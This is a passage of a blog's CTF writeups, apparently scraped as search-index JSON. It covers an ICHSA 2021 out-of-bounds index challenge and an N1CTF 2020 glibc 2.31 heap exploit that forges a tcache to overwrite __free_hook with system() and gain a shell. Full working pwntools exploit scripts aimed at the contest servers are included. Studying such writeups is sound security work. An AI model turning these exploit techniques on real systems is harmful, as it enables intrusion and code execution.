user_play = {0:1, 1:2, 2:0}[cpu_play]+1 r.sendline(str(user_play)) Unfortunately, we‚Äôll never obtain the flag by just winning normal rounds, because the option to obtain the flag requires 4294967295 Points. This is where Skip N Rounds comes into play. The code for skip_n_rounds() seems safe enough: printf(\"| You chose to skip %u rounds\\n\", rounds_to_skip); // Check for uint8_t integer overflow if(OVERFLOW_CHECK(rounds_to_skip,ARRAY_OF_PLAYS_MAX_SIZE)) SET_STATUS_TO_FALSE_AND_BREAK(status) if(game_ctx-\u003ecurrent_play + rounds_to_skip \u003e ARRAY_OF_PLAYS_MAX_SIZE) SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, \"| Overflow - Not jumping\\n\") CHANGE_GAME_CTX_FIELD(current_play, game_ctx-\u003ecurrent_play + rounds_to_skip) The last if-statement in there is bugged as a result of chalenge.h: #ifndef DEBUG_MODE ... #define POINTS_TO_PRINT_FLAG -1u // UINT64_MAX #define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg) #else #define POINTS_TO_PRINT_FLAG 0 #define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg) \\ {\\ printf(msg);\\ SET_STATUS_TO_FALSE_AND_BREAK(status)\\ } #endif The macro SET_STATUS_TO_FALSE_PRINT_AND_BREAK() expands to nothing when DEBUG_MODE is off. We know that this is the case because POINTS_TO_PRINT_FLAG is -1u and not 0. Because of this, game_ctx-\u003ecurrent_play can be increased beyond ARRAY_OF_PLAYS_MAX_SIZE. This results in an oob array index in play_next_round(): bool play_next_round() { ... struct play current_play = {0}; ... current_play = game_ctx-\u003earray_of_plays[game_ctx-\u003ecurrent_play]; That oob array index allows us to generate an arbitrary struct play current_play. To grasp why, we need to backtrack and cover a few other details. First off, game_ctx-\u003earray_of_plays == 0xC0FFEE2000, and game_ctx == 0xC0FFEEF000. This happens because of mmap() address hints: #define GAME_CTX_ID (void *) 0xC0FFEEFAC3 #define ARRAY_OF_PLAYS_ID (void *) 0xC0FFEE2A11 void init_game(){ // Allocate some memory for the game_ctx game_ctx = mmap(GAME_CTX_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMOUS, -1,0); ... // Allocate some memory for the game_ctx-\u003earray_of_plays game_ctx-\u003earray_of_plays = mmap(ARRAY_OF_PLAYS_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMO","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/:1:0","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"Full script from pwn import * context.binary = 'game' from ctypes import CDLL clib = CDLL('libc.so.6') clib.srand(0) ARRAY_OF_PLAYS_MAXSIZE = 170 array_of_plays = [clib.rand()%3 for _ in range(ARRAY_OF_PLAYS_MAXSIZE)] current_play = 0 r = remote('cop.ichsa.ctf.today', 8011) def choose(opt: int): r.recvuntil('[ ]\\b\\b') r.sendline(str(opt)) def win_round(): global current_play choose(2) r.recvuntil('[ ]\\b\\b') cpu_play = array_of_plays[current_play] current_play += 1 user_play = {0:1, 1:2, 2:0}[cpu_play]+1 r.sendline(str(user_play)) def skip(n: int): choose(3) r.recvuntil('[ ]\\b\\b\\b') r.sendline(str(n)) for i in range(5): win_round() OFFSET_TO_NAME = 0xd018 SIZEOF_PLAY = 24 while current_play \u003c OFFSET_TO_NAME//SIZEOF_PLAY: toskip = min([255, (OFFSET_TO_NAME-current_play*SIZEOF_PLAY)//SIZEOF_PLAY+1]) current_play += toskip skip(toskip) choose(5) # change username r.recvuntil('new username: ') fakeplay = p32(1) + b'a'*10 + pack(context.binary.symbols['print_flag']+0x66) + pack(1) r.sendline(b'a'*(current_play*SIZEOF_PLAY-OFFSET_TO_NAME)+fakeplay) choose(4) # enable ascii art choose(2) # win r.recvuntil('[ ]\\b\\b') r.sendline('1') print(r.recvall()) ","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/:2:0","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"Yet another FILE* walkthrough","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"EasyWrite [278] write? what? where? nc 124.156.183.246 20000 Files: easywrite, libc-2.31.so The library used in this writeup is pwnscripts. ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:0:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"TL;DR Input a fake tcache that has entries[2] = __free_hook-0x8 and count[2] = 1 locate the tcache pointer in libc to overwrite it with the fake one write ‚Äú/bin/sh‚Äù + system() to the next allocated memory enjoy shell from free(). ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:1:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Starting off We‚Äôll start off with some miscellanous information. Exact libc version: $ ./libc-database/identify libc-2.31.so libc6_2.31-0ubuntu9_amd64 Decompiler output: int main() { char **addr; // [rsp-28h] [rbp-28h] char *mem1; // [rsp-20h] [rbp-20h] char *mem2; // [rsp-18h] [rbp-18h] setbuf(stdout, 0); setbuf(stdin, 0); setbuf(stderr, 0); alarm(60); sleep(2); printf(\"Here is your gift:%p\\n\", \u0026setbuf); mem1 = malloc(768); // big 0x310 write(1, \"Input your message:\", 19); read(0, mem1, 767); write(1, \"Where to write?:\", 16); read(0, \u0026addr, 8); *addr = mem1; mem2 = malloc(48); // fastbin 0x40 write(1, \"Any last message?:\", 18); read(0, mem2, 47); free(mem2); return 0; } And checksec: [*] '/easywrite' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] '/libc-2.31.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled main() is really simple: 0. initialisation stuff (remove buffering, set timeout alarm) Free libc leak via printf() A raw read(0x300-1) to a pointer mem1 = malloc(0x300) A pointer (addr) is read from stdin via read(8), and the data at the pointer (*addr) is overwritten with mem1. This is the crux of the challenge. A raw read(0x30-1) to another pointer mem2 = malloc(0x30) free(mem2), and then exit(0) in __libc_start_main. Step (3) requires the user to provide a dereferencable pointer to the program. Since all protections (including ASLR) are on for ./easywrite, the pointer we provide in step (3) must be a part of libc.so.6‚Äôs allocated memory. From there, we can condense main() into an even simpler outline: The user gets to replace a single pointer within libc with a pointer to 0x300-1 bytes of user-controlled data, and The user gets to write 0x30-1 bytes to a malloc()‚Äôd pointer that is immediately free()‚Äôd. There‚Äôs no issue with analysing the binary, but figuring out what to do here is a lot harder. ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:2:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Write where? As the challenge title suggests, the key to pwning the binary here is to figure out where in Glibc to write up. The entire shared object is pretty big, but we can cut down on the search space with a few heuristics. First off, the bulk of libc is non-writeable. We‚Äôre only interested in writeable addresses, so we can skip everything here (the addresses are random; focus on the offsets): 0x00007f2afd967000 0x00007f2afd98c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afd98c000 0x00007f2afdb04000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb04000 0x00007f2afdb4e000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb4e000 0x00007f2afdb4f000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb4f000 0x00007f2afdb52000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so And just focus on this part: 0x00007f2afdb52000 0x00007f2afdb55000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb55000 0x00007f2afdb5b000 0x0000000000000000 rw- In IDA, that r/w section starts right off at libc‚Äôs Global Offset Table. That sounds like a good place to start. .got.plt:00000000001EB018 off_1EB018 dq offset memmove ; DATA XREF: bcopy-7E4DC‚Üër .got.plt:00000000001EB018 ; Indirect relocation .got.plt:00000000001EB020 off_1EB020 dq offset strnlen ; DATA XREF: sub_25350+4‚Üër .got.plt:00000000001EB020 ; Indirect relocation .got.plt:00000000001EB028 off_1EB028 dq offset wcschr ; DATA XREF: sub_25360+4‚Üër ... .got.plt:00000000001EB178 off_1EB178 dq offset strcasecmp ; DATA XREF: sub_25600+4‚Üër .got.plt:00000000001EB178 ; Indirect relocation .got.plt:00000000001EB180 off_1EB180 dq offset strncpy ; DATA XREF: sub_25610+4‚Üër .got.plt:00000000001EB180 ; Indirect relocation .got.plt:00000000001EB188 off_1EB188 dq offset memmove ; DATA XREF: sub_25620+4‚Üër .got.plt:00000000001EB188 _got_plt ends ; Indirect relocation ‚Ä¶or it would‚Äôve been, if there were any useful functions in the whole list. Long story short; all of the functions there are never called by the program1, so we‚Äôll move on. After the Procedure Linkage Table, there‚Äôs a long stretch of garbage in the form of the .data and .bss sections, along with a few other __libc_* sections that are basically never referenced either2. A few hours of blank staring later, and my eyes finally saw something I‚Äôd missed the last 10 times I tried scanning IDA View-A: .bss:00000000001EEB28 public __free_hook ; weak .bss:00000000001EEB28 ; __int64 (__fastcall *_free_hook)(_QWORD, _QWORD) .bss:00000000001EEB28 __free_hook dq ? ; DATA XREF: LOAD:0000000000008A48‚Üëo .bss:00000000001EEB28 ; .got:__free_hook_ptr‚Üëo __free_hook? Isn‚Äôt that that thing that I heard about once a long time ago in a writeup somewhere? To repeat something you may already know: __free_hook() is a function pointer that overrides the default behaviour of free() iff __free_hook != NULL. If we change __free_hook to point to a one_gadget (or something), we‚Äôll have beaten the challenge. Let‚Äôs try that. from pwnscripts import * context.binary = 'easywrite' context.libc_database = 'libc-database' context.libc = 'libc-2.31.so' context.log_level = 'debug' r = context.binary.process() context.libc.calc_base('setbuf', unpack_hex(r.recvline())) free_hook = 0x00000000001EEB28+context.libc.address r.sendafter('Input your message:', pack(context.libc.select_gadget(1))) r.sendafter('Where to write?:', pack(free_hook)) r.sendafter('Any last message?:', b'\\0') r.interactive() Things are never so simple, of course. [DEBUG] Received 0x12 bytes: b'Any last message?:' [DEBUG] Sent 0x1 bytes: 0 * 0x1 [*] Switching to interactive mode $ ls [DEBUG] Sent 0x3 bytes: b'ls\\n' [*] Got EOF while reading in interactive $ A little backtracing in gdb shows the issue. First, we‚Äôll let it crash, and observe the backtrace: [#0] Id 1, Name: \"ld-linux-x86-64\", stopped 0x555556b192a0 in ?? (), reason: SIGSEGV trace [#0] 0x555556b192a0 ‚Üí out 0x3c, al [#1] ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:3:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Digging into malloc.c Looking back at the code, I was convinced that the second allocation of memory had to be important ‚Äî this was a CTF challenge, after all. What I didn‚Äôt immediately understand was how glibc‚Äôs heap system could be affected by any write-to-libc. The heap always lies on a separate page; there‚Äôs no way to write to there directly. Lollygagging about gdb, I tried to find anything that might be useful to understanding the heap. gef‚û§ heap chunks Chunk(addr=0x555556b19010, size=0x290, flags=PREV_INUSE) [0x0000555556b19010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x555556b192a0, size=0x310, flags=PREV_INUSE) [0x0000555556b192a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x555556b195b0, size=0x40, flags=PREV_INUSE) [0x0000555556b195b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x555556b195f0, size=0x20a20, flags=PREV_INUSE) ‚Üê top chunk gef‚û§ heap bins Tcachebins for arena 0x7f53d96a8b80 Fastbins for arena 0x7f53d96a8b80 Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 Unsorted Bin for arena '*0x7f53d96a8b80' [+] Found 0 chunks in unsorted bin. Small Bins for arena '*0x7f53d96a8b80' [+] Found 0 chunks in 0 small non-empty bins. Large Bins for arena '*0x7f53d96a8b80' [+] Found 0 chunks in 0 large non-empty bins. Wait a minute. arena 0x7f53d96a8b80? That sounds a lot like a libc pointer. gef‚û§ heap arenas Arena (base=0x7f53d96a8b80, top=0x555556b195e0, last_remainder=0x0, next=0x7f53d96a8b80, next_free=0x0, system_mem=0x21000) gef‚û§ vmmap ... 0x00007f53d96a8000 0x00007f53d96ab000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f53d96ab000 0x00007f53d96b1000 0x0000000000000000 rw- ... And it is! In IDA Pro, this part of libc was labelled as the uninspiring dword_1EBB80, so this was definitely a lucky find. With a bit of searching, we can find the structure of the arena: struct malloc_state { __libc_lock_define (, mutex); int flags; int have_fastchunks; mfastbinptr fastbinsY[NFASTBINS]; // starts from 0x10 (?) mchunkptr top; // This is +0x60 mchunkptr last_remainder; mchunkptr bins[NBINS * 2 - 2]; unsigned int binmap[BINMAPSIZE]; struct malloc_state *next; struct malloc_state *next_free; INTERNAL_SIZE_T attached_threads; INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; } Of particular note are the various m.*ptr variables, as well as the next.* pointers. Overwriting any of these could change the behaviour of the heap. I started off by overwriting the top pointer, assessing what would happen if I replaced it with a pointer to garbage bytes #free_hook = 0x00000000001EEB28+context.libc.address arena = 0x1EBB80 + context.libc.address r.sendafter('Input your message:', b'a'*500) r.sendafter('Where to write?:', pack(arena + 0x60)) r.sendafter('Any last message?:', b'\\0') r.interactive() We get an interesting crash: [DEBUG] Received 0x10 bytes: b'Where to write?:' [DEBUG] Sent 0x8 bytes: 00000000 e0 cb 02 12 02 7f 00 00 ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ 00000008 [DEBUG] Received 0x1d bytes: b'malloc(): corrupted top size\\n' Traceback (most recent call last): The top chunk, like all malloc‚Äôd chunks, follows the following format: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk *fd, *bk; /* double links -- used only if free. */ struct malloc_chunk *fd_nextsize, *bk_nextsize; /* double links -- used only if free. */ } glibc detects that the top chunk is a bit too large, and sends the program to abort: static void *_int_malloc (mstate av, size_t bytes) { ... if (__glibc_unlikely (size \u003e av-\u003esystem_mem)) malloc_printerr (\"malloc(): corrupted top size\"); ... } If we fix the mchunk_size to fit the glibc check‚Ä¶ not much i","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:4:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Implementation Hell It was simple enough to create the fake tcache in python: SIZE = 0x40 #size of the second allocation def tcache_perthread_struct(fake_ptrs: dict): '''fake_ptrs has (address: size) key-pairs''' def csize2tidx(x): return (x-1)//16 -1 TCACHE_MAX_BINS = 0x40 counts = [0 for _ in range(TCACHE_MAX_BINS)] entries = [0 for _ in range(TCACHE_MAX_BINS)] for addr,size in fake_ptrs.items(): tidx = csize2tidx(size) counts[tidx] += 1 entries[tidx] = addr return b''.join(map(p16,counts)) + b''.join(map(p64,entries)) fake_tcache = tcache_perthread_struct({free_hook: SIZE}) The issue arrives with figuring out precisely where the tcache pointer is. IDA Pro was not4 very helpful. Eventually, I figured out from online sources that the tcache (the real tcache in memory; not the pointer to the tcache) is always located at heap_address+0x10. From there, I used gdb to search for pointers to that space in memory: gef‚û§ vmmap heap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555557527000 0x0000555557548000 0x0000000000000000 rw- [heap] gef‚û§ grep 0x0000555557527010 [+] Searching '\\x10\\x70\\x52\\x57\\x55\\x55\\x00\\x00' in memory [+] In '[heap]'(0x555557527000-0x555557548000), permission=rw- 0x5555575275b8 - 0x5555575275d8 ‚Üí \"\\x10\\x70\\x52\\x57\\x55\\x55\\x00\\x00[...]\" [+] In (0x7facf8661000-0x7facf8667000), permission=rw- 0x7facf8666530 - 0x7facf8666550 ‚Üí \"\\x10\\x70\\x52\\x57\\x55\\x55\\x00\\x00[...]\" gef‚û§ vmmap libc [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00007facf8473000 0x00007facf8498000 0x0000000000000000 r-- /home/a/libc-database/libs/libc6_2.31-0ubuntu9_amd64/libc.so.6 There‚Äôs only one pointer (0x7facf8666530) from the libc region, so we‚Äôll take that to be the tcache pointer. All that‚Äôs left to do is to grab a one_gadget and run with it: from pwnscripts import * context.binary = 'easywrite' context.libc_database = 'libc-database' context.libc = 'libc-2.31.so' context.log_level = 'debug' r = context.binary.process() context.libc.calc_base('setbuf', unpack_hex(r.recvline())) def tcache_perthread_struct(fake_ptrs: dict): '''fake_ptrs has (address: size) key-pairs''' def csize2tidx(x): return (x-1)//16 -1 TCACHE_MAX_BINS = 0x40 counts = [0 for _ in range(TCACHE_MAX_BINS)] entries = [0 for _ in range(TCACHE_MAX_BINS)] for addr,size in fake_ptrs.items(): tidx = csize2tidx(size) counts[tidx] += 1 entries[tidx] = addr return b''.join(map(p16,counts)) + b''.join(map(p64,entries)) SIZE = 0x40 # size of the 2nd allocation free_hook = 0x00000000001EEB28+context.libc.address tcache_pointer = 0x7facf8666530-0x00007facf8473000 + context.libc.address fake_tcache = tcache_perthread_struct({free_hook: SIZE}) r.sendafter('Input your message:', fake_tcache) r.sendafter('Where to write?:', pack(tcache_pointer)) r.sendafter('Any last message?:', pack(context.libc.select_gadget(1))) r.interactive() And we get a shell: stack [!] Unmapped address code:x86:64 0x7f792a05bda9 \u003cexecvpe+1337\u003e mov rax, QWORD PTR [rbp-0x68] 0x7f792a05bdad \u003cexecvpe+1341\u003e mov QWORD PTR [rbp-0x48], rax 0x7f792a05bdb1 \u003cexecvpe+1345\u003e jmp 0x7f792a05bcdb \u003cexecvpe+1131\u003e ‚Üí 0x7f792a05bdb6 \u003cexecvpe+1350\u003e call 0x7f792a0a7970 \u003c__stack_chk_fail\u003e ‚Ü≥ 0x7f792a0a7970 \u003c__stack_chk_fail+0\u003e endbr64 0x7f792a0a7974 \u003c__stack_chk_fail+4\u003e push rax 0x7f792a0a7975 \u003c__stack_chk_fail+5\u003e pop rax 0x7f792a0a7976 \u003c__stack_chk_fail+6\u003e lea rdi, [rip+0x876e7] # 0x7f792a12f064 0x7f792a0a797d \u003c__stack_chk_fail+13\u003e sub rsp, 0x8 0x7f792a0a7981 \u003c__stack_chk_fail+17\u003e call 0x7f792a0a7990 \u003c__fortify_fail\u003e arguments (guessed) __stack_chk_fail ( ) threads [#0] Id 1, Name: \"ld-linux-x86-64\", stopped 0x7f792a05bdb6 in execvpe (), reason: SIGSEGV trace [#0] 0x7f792a05bdb6 ‚Üí execvpe() [#1] 0x7f7929f9c0b3 ‚Üí __libc_start_main() [#2] 0x7f792a16a17e ‚Üí hlt [#3] 0x7ffe534a51a8 ‚Üí sbb al, 0x0 gef‚û§ Wait, what? ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:5:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Triage We‚Äôll modify the code a little bit to stop at the one_gadget: oneg = context.libc.select_gadget(1) gdb.attach(r, gdbscript='b *'+hex(oneg)+'\\nc') r.sendafter('Any last message?:', pack(oneg)) gdb is enlightening: $rax : 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $rbx : 0x00007f98a3f273a0 ‚Üí 0x8d4c5741fa1e0ff3 $rcx : 0x00007f98a3e42fb2 ‚Üí 0x5677fffff0003d48 (\"H=\"?) $rdx : 0x2f $rsp : 0x00007ffe510e5638 ‚Üí 0x00007f98a3f27376 ‚Üí 0x4d8b4800000000b8 $rbp : 0x00007ffe510e5660 ‚Üí 0x0000000000000000 $rsi : 0x00007f98a3f27376 ‚Üí 0x4d8b4800000000b8 $rdi : 0x00007f98a3f20b28 ‚Üí 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $rip : 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $r8 : 0x00007f98a3f20b28 ‚Üí 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $r9 : 0x00007f98a3d39548 ‚Üí 0x0000000000000000 $r10 : 0x00007f98a3f1dbe0 ‚Üí 0x0000555555ab55a0 ‚Üí 0x0000000000000000 $r11 : 0x246 $r12 : 0x00007f98a3f27150 ‚Üí 0x8949ed31fa1e0ff3 $r13 : 0x00007ffe510e5748 ‚Üí 0x000000000000001c $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 stack 0x00007ffe510e5638‚îÇ+0x0000: 0x00007f98a3f27376 ‚Üí 0x4d8b4800000000b8 ‚Üê $rsp 0x00007ffe510e5640‚îÇ+0x0008: 0x00007f98a3f25530 ‚Üí 0x0000555555ab52a0 ‚Üí 0x0000000000000000 0x00007ffe510e5648‚îÇ+0x0010: 0x0000555555ab52a0 ‚Üí 0x0000000000000000 0x00007ffe510e5650‚îÇ+0x0018: 0x00007f98a3f20b28 ‚Üí 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 0x00007ffe510e5658‚îÇ+0x0020: 0x0caf9f8a935f0f00 0x00007ffe510e5660‚îÇ+0x0028: 0x0000000000000000 ‚Üê $rbp 0x00007ffe510e5668‚îÇ+0x0030: 0x00007f98a3d590b3 ‚Üí \u003c__libc_start_main+243\u003e mov edi, eax 0x00007ffe510e5670‚îÇ+0x0038: 0x0000000000000000 code:x86:64 0x7f98a3e18cd8 \u003cexecvpe+1128\u003e add DWORD PTR [rbp+0x52], esi 0x7f98a3e18cdb \u003cexecvpe+1131\u003e mov QWORD PTR [r10+0x10], 0x0 0x7f98a3e18ce3 \u003cexecvpe+1139\u003e mov rdx, r12 ‚Üí 0x7f98a3e18ce6 \u003cexecvpe+1142\u003e mov rsi, r10 0x7f98a3e18ce9 \u003cexecvpe+1145\u003e lea rdi, [rip+0xd08ba] # 0x7f98a3ee95aa 0x7f98a3e18cf0 \u003cexecvpe+1152\u003e mov QWORD PTR [rbp-0x78], r11 0x7f98a3e18cf4 \u003cexecvpe+1156\u003e call 0x7f98a3e18160 \u003cexecve\u003e 0x7f98a3e18cf9 \u003cexecvpe+1161\u003e mov r11, QWORD PTR [rbp-0x78] 0x7f98a3e18cfd \u003cexecvpe+1165\u003e mov eax, DWORD PTR fs:[r14] threads [#0] Id 1, Name: \"ld-linux-x86-64\", stopped 0x7f98a3e18ce6 in execvpe (), reason: BREAKPOINT The one_gadget requirements here probably failed. These are the three4 gadgets available: 0xe6ce3 execve(\"/bin/sh\", r10, r12) constraints: [r10] == NULL || r10 == NULL [r12] == NULL || r12 == NULL 0xe6ce6 execve(\"/bin/sh\", r10, rdx) constraints: [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xe6ce9 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Cross-referencing between this and the gdb context, it becomes apparent that there‚Äôs no easy one_gadget to jump to. After spending an hour or so staring at ROP gadgets6 and potential one_gadget alternatives, I realised the rather obvious exploit path I was missing. __free_hook(ptr) is called with the ptr to be freed, which happens to be memory that we‚Äôre in control of. Why not just jump to system(), and put \"/bin/sh\" at the front of the allocated memory? fake_tcache = tcache_perthread_struct({free_hook-0x8: SIZE}) # -8 to store /bin/sh r.sendafter('Input your message:', fake_tcache) r.sendafter('Where to write?:', pack(tcache_pointer)) r.sendafter('Any last message?:', b'/bin/sh\\0' + pack(context.libc.symbols['system'])) r.interactive() [*] Switching to interactive mode $ echo hello [DEBUG] Sent 0xb bytes: b'echo hello\\n' [DEBUG] Received 0x6 bytes: b'hello\\n' hello $ It worked. [+] Opening connection to 124.156.183.246 on port 20000: Done [*] Switching to interactive mode [*] Got EOF while reading in interactive $ f ‚Ä¶locally. Not on remote. Long story short, I was using ld-linux.so --library-path to simulate the remote libc-2.31.so environment, but ld-linux doesn‚Äôt provide a perfect subs","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:6:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Full code from pwnscripts import * context.binary = 'easywrite' context.libc_database = 'libc-database' context.libc = 'libc-2.31.so' r = remote('124.156.183.246', 20000) context.libc.calc_base('setbuf', unpack_hex(r.recvline())) def tcache_perthread_struct(fake_ptrs: dict): '''fake_ptrs has (address: size) key-pairs''' def csize2tidx(x): return (x-1)//16 -1 TCACHE_MAX_BINS = 0x40 counts = [0 for _ in range(TCACHE_MAX_BINS)] entries = [0 for _ in range(TCACHE_MAX_BINS)] for addr,size in fake_ptrs.items(): tidx = csize2tidx(size) counts[tidx] += 1 entries[tidx] = addr return b''.join(map(p16,counts)) + b''.join(map(p64,entries)) SIZE = 0x40 # size of the 2nd allocation tcache_pointer = 0x7f638ae58530-0x00007f638ac65000+context.libc.address-0x40 fake_tcache = tcache_perthread_struct({context.libc.symbols['__free_hook']-0x8: SIZE}) r.sendafter('Input your message:', fake_tcache) r.sendafter('Where to write?:', pack(tcache_pointer)) r.sendafter('Any last message?:', b'/bin/sh\\0' + pack(context.libc.symbols['system'])) r.interactive() ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:7:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Footnotes ‚Ä¶which is practically identical what I said at the start of the writeup. You can personally test this by overwriting all the values of .got.plt with garbage in gdb. The program exits gracefully. Particularly, __libc_IO_vtables is useless here, because main() is committed to using raw read()s and write()s, instead of the standard I/O functions provided by libc. The code for fastbin-malloc doesn‚Äôt do much for us here. (Note that the fastbin_index for malloc(0x30) is 2) #define fastbin_index(sz) ((((unsigned int) (sz)) \u003e\u003e (SIZE_SZ == 8 ? 4 : 3)) - 2) #define fastbin(ar_ptr, idx) ((ar_ptr)-\u003efastbinsY[idx]) static void *_int_malloc (mstate av, size_t bytes) { INTERNAL_SIZE_T nb = ...; /* normalized request size */ unsigned int idx = ...; /* associated bin index */ mchunkptr victim; /* inspected/selected chunk */ ... if (this is a fastbin) { idx = fastbin_index (nb); mfastbinptr *fb = \u0026fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) { if (SINGLE_THREAD_P) *fb = victim-\u003efd; // else ... if (__glibc_likely (victim != NULL)) { size_t victim_idx = fastbin_index (chunksize (victim)); //if (__builtin_expect (victim_idx != idx, 0)) // malloc_printerr (\"malloc(): memory corruption (fast)\"); check_remalloced_chunk (av, victim, nb); #if USE_TCACHE ... #endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } .... } The most important thing to note here is that the pointer returned for the fastbin is always going to be the pointer directly located at av-\u003efastbinsY[idx], which our exploit can only replace with another valid heap pointer. A doubly allocated chunk of memory might be useful if there is more than one free(), but in this case, the fastbin is not very obviously useful. I tried to dig through malloc() in IDA to find it: v5 = unk_1F1520; if ( unk_1F1520 ) { if ( v4 \u003e= (unsigned __int64)off_1EB2D0 ) goto LABEL_7; } else { if ( unk_1F1528 ) goto LABEL_7; sub_9BAC0(); if ( (unsigned __int64)off_1EB2D0 \u003c= v4 ) goto LABEL_7; v5 = unk_1F1520; if ( !unk_1F1520 ) goto LABEL_7; } a4 = (__int16 *)(v5 + 2 * v4); v10 = *a4; if ( *a4 ) { v11 = v5 + 8 * v4; v7 = *(_QWORD **)(v11 + 128); *(_QWORD *)(v11 + 128) = *v7; *a4 = v10 - 1; v7[1] = 0LL; return (__int64)v7; } v5 vaguely appears to match up with the global tcache pointer, but none of the global variables (unk/off.*) here point towards the actual location (offset 0x1f34f0) of the tcache pointer I found. Conclusion: I have no idea what‚Äôs going on here. A modified version of one_gadget can actually detect two more one_gadgets, but those are unsatisfiable too. And I still think that this would be an interesting method. The gdb context shows that [rsp+0x10] is the location of the user-controlled tcache written earlier in the exploit. If a mov rsp, [rsp+0x10]; pop %; ret gadget (or anything effectively similar, like pop; pop; pop rsp; pop; ret) existed, it would be possible to write a ROP chain within the fake tcache itself. Staring at ropper and ROPGadget and IDA for an hour wasn‚Äôt enough to eliminate this possiblity: libc really does have a lot of gadgets, and a symbolic engine might be able to find what I may have missed. And if you know of a better way of running different libc versions, send me a ping over here; it‚Äôd be really useful to know. So far I have tried Using LD_PRELOAD, which in the correct order (ld-linux.so first) will run the binary without crashing, although other issues still surface Running ./ld-linux.so, as outlined in the writeup. This has numerous side effects, including the actual binary getting allocated to an 0x7f.* page instead of the expected 